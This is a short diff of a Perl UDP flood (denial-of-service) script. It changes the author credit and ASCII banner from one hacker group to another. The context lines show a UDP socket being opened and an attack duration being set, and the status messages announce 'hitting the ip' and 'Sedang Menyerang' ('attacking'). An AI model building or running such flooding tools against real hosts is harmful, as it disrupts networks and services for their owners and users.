@@ -58,13 +58,14 @@ $iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-printf "[0;32m>> Made by SamY from cqHack  \n";
-printf "[0;32m>>  __  __                              __  __      _       _ _  __  __          
-  \ \/ /_ __  _   ___   _____ _ __ ___\ \/ /_ __ | | ___ (_) |_\ \/ /___ _ __  
-   \  /| '_ \| | | \ \ / / _ \ '__/ __|\  /| '_ \| |/ _ \| | __|\  // _ \ '_ \ 
-   /  \| | | | |_| |\ V /  __/ |  \__ \/  \| |_) | | (_) | | |_ /  \  __/ | | |
-  /_/\_\_| |_|\__,_| \_/ \___|_|  |___/_/\_\ .__/|_|\___/|_|\__/_/\_\___|_| |_|
-                                           |_|                                 \n";
+printf "[0;32m>> Made by XnuversXploitXen from TangerangCyber  \n";
+printf "[0;32m>>
+  __  __
+  \ \/ /_ __  _   ___   _____ _ __ ___  
+   \  /| '_ \| | | \ \ / / _ \ '__/ __|
+   /  \| | | | |_| |\ V /  __/ |  \__ \
+  /_/\_\_| |_|\__,_| \_/ \___|_|  |___/ \n";
+  
 printf "[0;31m>> hitting the ip    \n";
 printf "[0;36m>> hitting the ports     \n";
 printf "[0;36m>> Sedang Menyerang     \n";
